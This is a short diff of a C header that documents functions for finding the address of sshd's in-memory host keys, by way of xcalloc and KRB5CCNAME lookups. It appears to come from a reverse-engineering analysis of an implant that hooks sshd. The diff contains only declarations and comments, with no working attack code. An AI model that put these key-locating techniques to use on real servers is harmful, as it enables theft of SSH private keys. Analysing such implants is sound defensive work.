@@ -2202,7 +2202,32 @@ extern BOOL find_link_map_l_audit_any_plt_bitmask(
 	instruction_search_ctx_t *search_ctx);
 
 /**
- * @brief finds the address of `sensitive_data.host_keys` in sshd
+ * @brief finds the address of `sensitive_data.host_keys` in sshd by using
+ * @ref XREF_xcalloc_zero_size in `xcalloc`
+ *
+ * FIXME: add detail 
+ *
+ * @param data_start start of the sshd data segment
+ * @param data_end end of the sshd data segment
+ * @param code_start start of the sshd code segment
+ * @param code_end end of the sshd code segment
+ * @param string_refs info about resolved functions
+ * @param host_keys_out pointer to receive the address of the host keys (`struct sshkey` in sshd)
+ * @return BOOL TRUE if the address was found, FALSE otherwise
+ */
+extern BOOL sshd_get_host_keys_address_via_xcalloc(
+	u8 *data_start,
+	u8 *data_end,
+	u8 *code_start,
+	u8 *code_end,
+	string_references_t *string_refs,
+	void **host_keys_out);
+
+/**
+ * @brief finds the address of `sensitive_data.host_keys` in sshd by using
+ * @ref getenv( @ref STR_KRB5CCNAME )
+ *
+ * FIXME: add detail 
  * 
  * @param data_start start of the sshd data segment
  * @param data_end end of the sshd data segment
@@ -2212,13 +2237,13 @@ extern BOOL find_link_map_l_audit_any_plt_bitmask(
  * @param host_keys_out pointer to receive the address of the host keys (`struct sshkey` in sshd)
  * @return BOOL TRUE if the address was found, FALSE otherwise
  */
-extern BOOL sshd_get_host_keys_address(
-	uint8_t *data_start,
-	uint8_t *data_end,
-	uint8_t *code_start,
-	uint8_t *code_end,
-	string_references_t *string_refs,
-	void **host_keys_out);
+extern BOOL sshd_get_host_keys_address_via_krb5ccname(
+	u8 *data_start,
+	u8 *data_end,
+	u8 *code_start,
+	u8 *code_end,
+	void **host_keys_out,
+	elf_info_t *elf);
 
 /**
  * @brief counts the number of times the IFUNC resolver is called
